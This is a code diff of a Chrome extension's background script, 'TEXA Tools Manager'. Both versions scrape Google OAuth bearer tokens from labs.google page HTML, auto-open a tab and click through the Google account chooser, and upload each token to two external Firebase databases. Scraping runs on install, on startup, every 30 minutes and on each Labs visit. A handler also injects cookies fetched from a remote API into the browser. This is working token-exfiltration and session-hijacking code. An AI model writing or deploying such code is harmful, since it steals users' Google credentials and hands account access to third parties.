@@ -1,118 +1,73 @@
 // =============================================
 // TEXA Tools Manager - Background Service Worker
-// Silent Token Scraping & Auto-Login Flow
+// Token Scraping & Auto-Login Flow
 // =============================================
 
-// Firebase REST API Configuration - PRIMARY
+// Firebase REST API Configuration
 const FIREBASE_PRIMARY = {
     projectId: 'tekno-cfaba',
     tokenPath: 'artifacts/my-token-vault/public/data/tokens/google_oauth_user_1'
 };
 
-// Firebase REST API Configuration - BACKUP
 const FIREBASE_BACKUP = {
     projectId: 'tekno-335f8',
     rtdbUrl: 'https://tekno-335f8-default-rtdb.asia-southeast1.firebasedatabase.app',
     tokenPath: 'texa_tokens/google_oauth_user_1'
 };
 
-// Target URL for token scraping
 const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';
+const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;
 
-// Build Firestore REST API URL (Primary)
 function getFirestoreUrl(projectId, path) {
     return `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/${path}`;
 }
 
-// Build Realtime Database URL (Backup)
 function getRtdbUrl(path) {
     return `${FIREBASE_BACKUP.rtdbUrl}/${path}.json`;
 }
 
 // =============================================
-// OFFSCREEN DOCUMENT MANAGEMENT
+// STATE
 // =============================================
 
-let offscreenCreating = null;
+let autoLoginTabId = null;
+let isAutoLoginInProgress = false;
+let tokenFoundCallback = null;
 
-async function setupOffscreenDocument() {
-    const offscreenUrl = chrome.runtime.getURL('offscreen.html');
+// =============================================
+// MAIN SCRAPE FUNCTION
+// =============================================
+
+async function scrapeToken(forceNewTab = false) {
+    console.log('🔄 TEXA: Starting token scrape...');
 
     try {
-        const existingContexts = await chrome.runtime.getContexts({
-            contextTypes: ['OFFSCREEN_DOCUMENT'],
-            documentUrls: [offscreenUrl]
-        });
-
-        if (existingContexts.length > 0) {
-            return;
-        }
-
-        if (offscreenCreating) {
-            await offscreenCreating;
-        } else {
-            offscreenCreating = chrome.offscreen.createDocument({
-                url: offscreenUrl,
-                reasons: ['DOM_SCRAPING'],
-                justification: 'Silent token extraction from Google Labs Flow'
-            });
-            await offscreenCreating;
-            offscreenCreating = null;
-        }
-    } catch (e) {
-        console.log('TEXA: Offscreen setup error:', e.message);
-    }
-}
-
-async function closeOffscreenDocument() {
-    try {
-        await chrome.offscreen.closeDocument();
-    } catch (e) { }
-}
-
-// =============================================
-// TOKEN REGEX
-// =============================================
-
-const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;
-
-// =============================================
-// MAIN TOKEN SCRAPING FUNCTION
-// =============================================
-
-async function silentScrapeToken() {
-    console.log('TEXA: Starting token scrape...');
-
-    try {
-        // Method 1: Check existing Google Labs tabs first
-        const existingTabs = await chrome.tabs.query({ url: 'https://labs.google/*' });
-        if (existingTabs.length > 0) {
-            console.log('TEXA: Found existing Google Labs tab, extracting...');
-            const result = await extractFromExistingTab(existingTabs[0].id);
-            if (result.success) {
-                return result;
+        // Method 1: Try existing Labs tabs
+        if (!forceNewTab) {
+            const labsTabs = await chrome.tabs.query({ url: '*://labs.google/*' });
+            for (const tab of labsTabs) {
+                if (!tab.url.includes('accounts.google.com')) {
+                    console.log('🔄 TEXA: Found existing Labs tab:', tab.id);
+                    const result = await extractTokenFromTab(tab.id);
+                    if (result.success) {
+                        return result;
+                    }
+                }
             }
         }
 
-        // Method 2: Try direct fetch
-        console.log('TEXA: Trying direct fetch...');
-        const directResult = await directFetchToken();
-        if (directResult.success) {
-            return directResult;
-        }
-
-        // Method 3: Check if we need to login - open Labs and let auto-login handle it
-        console.log('TEXA: Token not found, initiating auto-login flow...');
-        return await initiateAutoLoginFlow();
+        // Method 2: Start auto-login flow (opens tab, auto-clicks, scrapes)
+        console.log('🔄 TEXA: No token found, starting auto-login flow...');
+        return await startAutoLoginFlow();
 
     } catch (error) {
-        console.error('TEXA: Scrape error:', error);
+        console.error('🔄 TEXA Error:', error);
         return { success: false, error: error.message };
     }
 }
 
-// Extract token from existing tab
-async function extractFromExistingTab(tabId) {
+// Extract token from tab
+async function extractTokenFromTab(tabId) {
     try {
         const results = await chrome.scripting.executeScript({
             target: { tabId: tabId },
@@ -120,283 +75,221 @@ async function extractFromExistingTab(tabId) {
                 const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
                 const html = document.documentElement.outerHTML;
                 const matches = html.match(regex);
-                return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
+                if (matches && matches.length > 0) {
+                    return matches.reduce((a, b) => a.length > b.length ? a : b);
+                }
+                return null;
             }
         });
 
-        if (results && results[0] && results[0].result) {
+        if (results?.[0]?.result) {
             const token = results[0].result;
-            console.log('TEXA: Token extracted from existing tab!');
-            await saveTokenToFirebase(token, 'Existing Tab Extraction');
-            return { success: true, token: token, method: 'existing_tab' };
+            console.log('✅ TEXA: Token extracted!');
+            await saveToken(token, 'Tab Extraction');
+            return { success: true, token, method: 'tab_extraction' };
         }
     } catch (e) {
-        console.log('TEXA: Could not extract from existing tab:', e.message);
-    }
-    return { success: false };
-}
-
-// Direct fetch from service worker
-async function directFetchToken() {
-    try {
-        const response = await fetch(GOOGLE_LABS_URL, {
-            credentials: 'include',
-            headers: { 'Accept': 'text/html' }
-        });
-
-        if (response.ok) {
-            const html = await response.text();
-            const matches = html.match(TOKEN_REGEX);
-            if (matches && matches.length > 0) {
-                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
-                await saveTokenToFirebase(token, 'Direct Fetch');
-                return { success: true, token: token, method: 'direct_fetch' };
-            }
-
-            // Check if redirected to login
-            if (html.includes('accounts.google.com') || html.includes('Sign in')) {
-                return { success: false, needsLogin: true };
-            }
-        }
-    } catch (e) {
-        console.log('TEXA: Direct fetch failed:', e.message);
+        console.log('⚠️ TEXA: Cannot extract from tab:', e.message);
     }
     return { success: false };
 }
 
 // =============================================
 // AUTO-LOGIN FLOW
-// Opens Google Labs in background tab, auto-clicks account
 // =============================================
 
-let autoLoginInProgress = false;
-let autoLoginTabId = null;
-
-async function initiateAutoLoginFlow() {
-    if (autoLoginInProgress) {
-        console.log('TEXA: Auto-login already in progress, waiting...');
-        return { success: false, error: 'Auto-login in progress' };
+function startAutoLoginFlow() {
+    if (isAutoLoginInProgress) {
+        console.log('⏳ TEXA: Auto-login already in progress');
+        return Promise.resolve({ success: false, error: 'Already in progress' });
     }
 
-    autoLoginInProgress = true;
-    console.log('TEXA: Starting auto-login flow...');
+    isAutoLoginInProgress = true;
 
     return new Promise(async (resolve) => {
+        console.log('🚀 TEXA: Starting auto-login flow...');
+
+        // Timeout for entire flow
+        const timeout = setTimeout(() => {
+            console.log('⏰ TEXA: Auto-login timeout');
+            cleanup();
+            resolve({ success: false, error: 'Timeout' });
+        }, 90000); // 90 seconds for full flow
+
+        const cleanup = async () => {
+            isAutoLoginInProgress = false;
+            chrome.tabs.onUpdated.removeListener(tabUpdateHandler);
+            chrome.runtime.onMessage.removeListener(messageHandler);
+            if (autoLoginTabId) {
+                try {
+                    // Only close if it's our auto-login tab
+                    const tab = await chrome.tabs.get(autoLoginTabId);
+                    if (tab) {
+                        await chrome.tabs.remove(autoLoginTabId);
+                        console.log('🗑️ TEXA: Closed auto-login tab');
+                    }
+                } catch (e) { }
+                autoLoginTabId = null;
+            }
+        };
+
+        // Tab update handler
+        const tabUpdateHandler = async (tabId, changeInfo, tab) => {
+            if (tabId !== autoLoginTabId) return;
+
+            if (changeInfo.status === 'complete' && tab.url) {
+                console.log('📄 TEXA: Tab loaded:', tab.url.substring(0, 50));
+
+                // On Google Labs (not login page) - try to extract token
+                if (tab.url.includes('labs.google') && !tab.url.includes('accounts.google.com')) {
+                    console.log('✨ TEXA: On Google Labs, waiting to extract...');
+
+                    // Wait for page to fully load
+                    await new Promise(r => setTimeout(r, 3000));
+
+                    const result = await extractTokenFromTab(tabId);
+                    if (result.success) {
+                        clearTimeout(timeout);
+                        await cleanup();
+                        resolve(result);
+                    }
+                }
+                // On login page - autoLoginScript.js will handle clicking
+            }
+        };
+
+        // Message handler for token found
+        const messageHandler = async (msg, sender) => {
+            if (msg.type === 'TEXA_TOKEN_FOUND' && msg.token) {
+                console.log('✅ TEXA: Token found via message!');
+                clearTimeout(timeout);
+                await saveToken(msg.token, msg.source || 'Auto-Login');
+                await cleanup();
+                resolve({ success: true, token: msg.token, method: 'auto_login' });
+            }
+
+            if (msg.type === 'TEXA_AUTO_LOGIN_CLICKED') {
+                console.log('👆 TEXA: Account clicked, action:', msg.action);
+            }
+        };
+
+        chrome.tabs.onUpdated.addListener(tabUpdateHandler);
+        chrome.runtime.onMessage.addListener(messageHandler);
+
         try {
-            // Create tab to Google Labs (background tab)
+            // Create the tab
             const tab = await chrome.tabs.create({
                 url: GOOGLE_LABS_URL,
-                active: false  // Background tab - less intrusive
+                active: true  // Make active so user can see if needed
             });
 
             autoLoginTabId = tab.id;
-            console.log('TEXA: Created background tab for auto-login:', tab.id);
-
-            // Set timeout for the whole flow
-            const flowTimeout = setTimeout(async () => {
-                console.log('TEXA: Auto-login flow timeout');
-                autoLoginInProgress = false;
-
-                // Try to extract token one last time before closing
-                const lastTry = await extractFromExistingTab(tab.id);
-                if (lastTry.success) {
-                    await closeAutoLoginTab(tab.id);
-                    resolve(lastTry);
-                    return;
-                }
-
-                await closeAutoLoginTab(tab.id);
-                resolve({ success: false, error: 'Auto-login timeout' });
-            }, 60000); // 60 second timeout for full login flow
-
-            // Listen for when the tab finishes loading
-            const onUpdated = async (tabId, changeInfo, tabInfo) => {
-                if (tabId !== tab.id) return;
-
-                if (changeInfo.status === 'complete') {
-                    console.log('TEXA: Tab loaded:', tabInfo.url);
-
-                    // Check if we're on Google Labs (not login page)
-                    if (tabInfo.url && tabInfo.url.includes('labs.google') && !tabInfo.url.includes('accounts.google.com')) {
-                        console.log('TEXA: Successfully on Google Labs, extracting token...');
-
-                        // Wait a bit for page to fully render
-                        setTimeout(async () => {
-                            const result = await extractFromExistingTab(tabId);
-
-                            if (result.success) {
-                                clearTimeout(flowTimeout);
-                                chrome.tabs.onUpdated.removeListener(onUpdated);
-                                autoLoginInProgress = false;
-                                await closeAutoLoginTab(tabId);
-                                resolve(result);
-                            }
-                        }, 3000);
-                    }
-                    // If on login page, the autoLoginScript.js content script will handle clicking
-                }
-            };
-
-            chrome.tabs.onUpdated.addListener(onUpdated);
-
-            // Also listen for token found messages
-            const tokenListener = async (msg, sender) => {
-                if (msg.type === 'TEXA_TOKEN_FOUND' && msg.token) {
-                    console.log('TEXA: Token found during auto-login!');
-                    clearTimeout(flowTimeout);
-                    chrome.tabs.onUpdated.removeListener(onUpdated);
-                    chrome.runtime.onMessage.removeListener(tokenListener);
-                    autoLoginInProgress = false;
-
-                    await saveTokenToFirebase(msg.token, 'Auto-Login Flow');
-                    await closeAutoLoginTab(tab.id);
-
-                    resolve({ success: true, token: msg.token, method: 'auto_login' });
-                }
-
-                if (msg.type === 'TEXA_AUTO_LOGIN_CLICKED') {
-                    console.log('TEXA: Account clicked, waiting for redirect...');
-                }
-            };
-
-            chrome.runtime.onMessage.addListener(tokenListener);
+            console.log('📑 TEXA: Created tab:', tab.id);
 
         } catch (error) {
-            console.error('TEXA: Auto-login flow error:', error);
-            autoLoginInProgress = false;
+            clearTimeout(timeout);
+            await cleanup();
             resolve({ success: false, error: error.message });
         }
     });
 }
 
-async function closeAutoLoginTab(tabId) {
-    try {
-        await chrome.tabs.remove(tabId);
-        console.log('TEXA: Closed auto-login tab');
-    } catch (e) { }
-    autoLoginTabId = null;
-}
-
 // =============================================
-// FIREBASE TOKEN STORAGE (Dual Database)
+// TOKEN STORAGE
 // =============================================
 
-async function saveTokenToFirebase(token, source = 'Extension') {
+async function saveToken(token, source) {
     const timestamp = new Date().toISOString();
+    console.log('💾 TEXA: Saving token from:', source);
 
-    const results = await Promise.allSettled([
-        saveToPrimary(token, source, timestamp),
-        saveToBackup(token, source, timestamp)
-    ]);
-
-    console.log('TEXA: Primary save:', results[0].status);
-    console.log('TEXA: Backup save:', results[1].status);
-
+    // Save to local storage immediately
     await chrome.storage.local.set({
         'texa_bearer_token': token,
         'texa_token_updated': timestamp,
         'texa_token_source': source
     });
 
-    if (results[0].status === 'fulfilled' || results[1].status === 'fulfilled') {
-        console.log('TEXA: Token saved to Firebase');
-        return { success: true };
-    }
+    // Save to Firebase (primary + backup)
+    const results = await Promise.allSettled([
+        saveToPrimary(token, source, timestamp),
+        saveToBackup(token, source, timestamp)
+    ]);
 
-    throw new Error('Both databases failed');
+    console.log('💾 TEXA: Primary:', results[0].status, '| Backup:', results[1].status);
+    return results[0].status === 'fulfilled' || results[1].status === 'fulfilled';
 }
 
 async function saveToPrimary(token, source, timestamp) {
     const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
-    const body = {
-        fields: {
-            token: { stringValue: token },
-            id: { stringValue: 'google_oauth_user_1' },
-            updatedAt: { timestampValue: timestamp },
-            source: { stringValue: source },
-            note: { stringValue: 'Auto-scraped dari Chrome Extension TEXA' }
-        }
-    };
-
     const response = await fetch(url, {
         method: 'PATCH',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
+        body: JSON.stringify({
+            fields: {
+                token: { stringValue: token },
+                id: { stringValue: 'google_oauth_user_1' },
+                updatedAt: { timestampValue: timestamp },
+                source: { stringValue: source }
+            }
+        })
     });
-
-    if (!response.ok) throw new Error(`Primary Firebase error: ${response.status}`);
-    return { success: true, db: 'primary' };
+    if (!response.ok) throw new Error(`Primary error: ${response.status}`);
+    return { success: true };
 }
 
 async function saveToBackup(token, source, timestamp) {
     const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
-    const body = {
-        token: token,
-        id: 'google_oauth_user_1',
-        updatedAt: timestamp,
-        source: source,
-        note: 'Auto-scraped dari Chrome Extension TEXA'
-    };
-
     const response = await fetch(url, {
         method: 'PUT',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
+        body: JSON.stringify({
+            token,
+            id: 'google_oauth_user_1',
+            updatedAt: timestamp,
+            source
+        })
     });
-
-    if (!response.ok) throw new Error(`Backup Firebase error: ${response.status}`);
-    return { success: true, db: 'backup' };
+    if (!response.ok) throw new Error(`Backup error: ${response.status}`);
+    return { success: true };
 }
 
-async function getTokenFromFirebase() {
+async function getToken() {
+    // Try primary Firebase
     try {
-        const result = await getFromPrimary();
-        if (result.success) return result;
+        const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
+        const response = await fetch(url);
+        if (response.ok) {
+            const data = await response.json();
+            const token = data.fields?.token?.stringValue;
+            if (token) {
+                return { success: true, token, source: 'primary', updatedAt: data.fields?.updatedAt?.timestampValue };
+            }
+        }
     } catch (e) {
-        console.log('TEXA: Primary read failed, trying backup...');
+        console.log('⚠️ TEXA: Primary fetch failed');
     }
 
+    // Try backup Firebase
     try {
-        const result = await getFromBackup();
-        if (result.success) return result;
+        const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
+        const response = await fetch(url);
+        if (response.ok) {
+            const data = await response.json();
+            if (data?.token) {
+                return { success: true, token: data.token, source: 'backup', updatedAt: data.updatedAt };
+            }
+        }
     } catch (e) {
-        console.log('TEXA: Backup read failed, trying cache...');
+        console.log('⚠️ TEXA: Backup fetch failed');
     }
 
+    // Try local cache
     const cached = await chrome.storage.local.get(['texa_bearer_token', 'texa_token_updated']);
     if (cached.texa_bearer_token) {
-        return { success: true, token: cached.texa_bearer_token, updatedAt: cached.texa_token_updated, fromCache: true };
+        return { success: true, token: cached.texa_bearer_token, source: 'cache', updatedAt: cached.texa_token_updated };
     }
 
-    return { success: false, error: 'Token not found' };
-}
-
-async function getFromPrimary() {
-    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
-    const response = await fetch(url);
-    if (!response.ok) throw new Error(`Primary error: ${response.status}`);
-
-    const data = await response.json();
-    const token = data.fields?.token?.stringValue;
-
-    if (token) {
-        await chrome.storage.local.set({ 'texa_bearer_token': token });
-        return { success: true, token, updatedAt: data.fields?.updatedAt?.timestampValue, source: 'primary' };
-    }
-    throw new Error('No token in primary');
-}
-
-async function getFromBackup() {
-    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
-    const response = await fetch(url);
-    if (!response.ok) throw new Error(`Backup error: ${response.status}`);
-
-    const data = await response.json();
-    if (data && data.token) {
-        await chrome.storage.local.set({ 'texa_bearer_token': data.token });
-        return { success: true, token: data.token, updatedAt: data.updatedAt, source: 'backup' };
-    }
-    throw new Error('No token in backup');
+    return { success: false, error: 'No token found' };
 }
 
 // =============================================
@@ -404,111 +297,71 @@ async function getFromBackup() {
 // =============================================
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    console.log('Background received:', message.type || message.action);
+    const type = message.type || message.action;
+    console.log('📨 TEXA Background:', type);
 
-    // Token found from content script
-    if (message.type === 'TEXA_TOKEN_FOUND') {
-        saveTokenToFirebase(message.token, message.source || 'Content Script')
-            .then(() => {
-                chrome.runtime.sendMessage({ type: 'TEXA_TOKEN_SAVED', token: message.token });
-            })
-            .catch(err => console.error('Save failed:', err));
-        sendResponse({ success: true });
-        return;
+    switch (type) {
+        case 'TEXA_TOKEN_FOUND':
+            saveToken(message.token, message.source || 'Content Script');
+            sendResponse({ success: true });
+            break;
+
+        case 'TEXA_SCRAPE_TOKEN':
+            scrapeToken(message.forceNew)
+                .then(r => sendResponse(r))
+                .catch(e => sendResponse({ success: false, error: e.message }));
+            return true;
+
+        case 'TEXA_GET_TOKEN':
+            getToken()
+                .then(r => sendResponse(r))
+                .catch(e => sendResponse({ success: false, error: e.message }));
+            return true;
+
+        case 'TEXA_AUTO_LOGIN_CLICKED':
+            console.log('👆 TEXA: Account clicked:', message.action);
+            sendResponse({ success: true });
+            break;
+
+        case 'TEXA_OPEN_TOOL':
+            handleOpenTool(message)
+                .then(r => sendResponse(r))
+                .catch(e => sendResponse({ success: false, error: e.message }));
+            return true;
+
+        case 'SAVE_TOKEN':
+            saveToken(message.payload?.token, message.payload?.service)
+                .then(() => sendResponse({ status: 'success' }))
+                .catch(e => sendResponse({ status: 'error', msg: e.message }));
+            return true;
     }
-
-    // Auto-login clicked notification
-    if (message.type === 'TEXA_AUTO_LOGIN_CLICKED') {
-        console.log('TEXA: Auto-login account clicked on:', message.url);
-        sendResponse({ success: true });
-        return;
-    }
-
-    // Manual scrape request from popup
-    if (message.type === 'TEXA_SCRAPE_TOKEN') {
-        silentScrapeToken()
-            .then(result => sendResponse(result))
-            .catch(err => sendResponse({ success: false, error: err.message }));
-        return true;
-    }
-
-    // Get token request
-    if (message.type === 'TEXA_GET_TOKEN') {
-        getTokenFromFirebase()
-            .then(result => sendResponse(result))
-            .catch(err => sendResponse({ success: false, error: err.message }));
-        return true;
-    }
-
-    // Legacy SAVE_TOKEN
-    if (message.action === 'SAVE_TOKEN') {
-        saveTokenToFirebase(message.payload.token, message.payload.service)
-            .then(() => sendResponse({ status: 'success' }))
-            .catch(err => sendResponse({ status: 'error', msg: err.message }));
-        return true;
-    }
-
-    // Open tool with cookies
-    if (message.type === 'TEXA_OPEN_TOOL') {
-        handleOpenTool(message)
-            .then(res => sendResponse(res))
-            .catch(err => sendResponse({ success: false, error: err.message }));
-        return true;
-    }
-
-    // Start auto-login flow manually
-    if (message.type === 'TEXA_START_AUTO_LOGIN') {
-        initiateAutoLoginFlow()
-            .then(result => sendResponse(result))
-            .catch(err => sendResponse({ success: false, error: err.message }));
-        return true;
-    }
-
-    // Login success notification
-    if (message.type === 'TEXA_LOGIN_SUCCESS') {
-        chrome.notifications.create({
-            type: 'basic',
-            iconUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
-            title: 'TEXA Tools',
-            message: 'Login berhasil! Extension siap digunakan.'
-        });
-        return;
-    }
-
-    return false;
 });
 
 // =============================================
-// TOOL HANDLING
+// TOOL OPENING
 // =============================================
 
 async function handleOpenTool(data) {
     const { targetUrl, apiUrl, authHeader } = data;
 
-    try {
-        if (!apiUrl) {
-            await chrome.tabs.create({ url: targetUrl });
-            return { success: true };
-        }
-
-        const fetchOptions = authHeader ? { headers: { 'Authorization': authHeader } } : {};
-        const response = await fetch(apiUrl, fetchOptions);
-
-        if (!response.ok) throw new Error(`API error: ${response.status}`);
-
-        const cookiesData = await response.json();
-        let cookies = extractCookies(cookiesData);
-
-        for (const cookie of cookies) {
-            try { await setCookie(cookie, targetUrl); } catch (e) { }
-        }
-
+    if (!apiUrl) {
         await chrome.tabs.create({ url: targetUrl });
-        return { success: true, injectedCount: cookies.length };
-    } catch (error) {
-        await chrome.tabs.create({ url: targetUrl });
-        return { success: true, fallback: true };
+        return { success: true };
     }
+
+    try {
+        const response = await fetch(apiUrl, authHeader ? { headers: { 'Authorization': authHeader } } : {});
+        if (response.ok) {
+            const cookiesData = await response.json();
+            const cookies = extractCookies(cookiesData);
+            for (const cookie of cookies) {
+                try { await setCookie(cookie, targetUrl); } catch (e) { }
+            }
+        }
+    } catch (e) { }
+
+    await chrome.tabs.create({ url: targetUrl });
+    return { success: true };
 }
 
 function extractCookies(data) {
@@ -523,56 +376,52 @@ function extractCookies(data) {
             }
         }
     }
-    if (Array.isArray(data)) return data;
-    if (data.cookies) return data.cookies;
-    return [];
+    return Array.isArray(data) ? data : (data.cookies || []);
 }
 
-function setCookie(cookieData, targetUrl) {
-    const domain = cookieData.domain || new URL(targetUrl).hostname;
-    const rawDomain = domain.startsWith('.') ? domain.substring(1) : domain;
-
+function setCookie(c, targetUrl) {
+    const domain = c.domain || new URL(targetUrl).hostname;
     return chrome.cookies.set({
-        url: cookieData.url || `https://${rawDomain}${cookieData.path || '/'}`,
-        name: cookieData.name,
-        value: cookieData.value,
-        path: cookieData.path || '/',
-        secure: cookieData.secure !== false,
-        httpOnly: cookieData.httpOnly === true,
-        domain: cookieData.domain,
-        expirationDate: cookieData.expirationDate,
-        sameSite: cookieData.sameSite
+        url: c.url || `https://${domain.replace(/^\./, '')}${c.path || '/'}`,
+        name: c.name,
+        value: c.value,
+        path: c.path || '/',
+        secure: c.secure !== false,
+        httpOnly: c.httpOnly === true,
+        domain: c.domain,
+        expirationDate: c.expirationDate,
+        sameSite: c.sameSite
     });
 }
 
 // =============================================
-// AUTO-SCRAPE ON STARTUP & ALARM
+// LIFECYCLE EVENTS
 // =============================================
 
 chrome.runtime.onStartup.addListener(() => {
-    console.log('TEXA: Extension started, running scrape...');
-    setTimeout(() => silentScrapeToken(), 5000);
+    console.log('🔄 TEXA: Extension started');
+    setTimeout(() => scrapeToken(), 5000);
 });
 
 chrome.runtime.onInstalled.addListener(() => {
-    console.log('TEXA: Extension installed, setting up alarms...');
+    console.log('✅ TEXA: Extension installed');
     chrome.alarms.create('tokenRefresh', { periodInMinutes: 30 });
-    setTimeout(() => silentScrapeToken(), 10000);
+    setTimeout(() => scrapeToken(), 10000);
 });
 
 chrome.alarms.onAlarm.addListener((alarm) => {
     if (alarm.name === 'tokenRefresh') {
-        console.log('TEXA: Periodic token refresh...');
-        silentScrapeToken();
+        console.log('⏰ TEXA: Periodic refresh');
+        scrapeToken();
     }
 });
 
-// Scrape when user visits Google Labs
-chrome.webNavigation.onCompleted.addListener(async (details) => {
+// Auto-scrape when visiting Labs
+chrome.webNavigation.onCompleted.addListener((details) => {
     if (details.url.includes('labs.google') && !details.url.includes('accounts.google.com')) {
-        console.log('TEXA: User on Google Labs, scraping...');
-        setTimeout(() => silentScrapeToken(), 3000);
+        console.log('📍 TEXA: User on Labs, scraping...');
+        setTimeout(() => extractTokenFromTab(details.tabId), 2000);
     }
 }, { url: [{ hostContains: 'labs.google' }] });
 
-console.log('TEXA Tools Manager - Background Script Loaded');
+console.log('🚀 TEXA Tools Manager - Background Loaded');
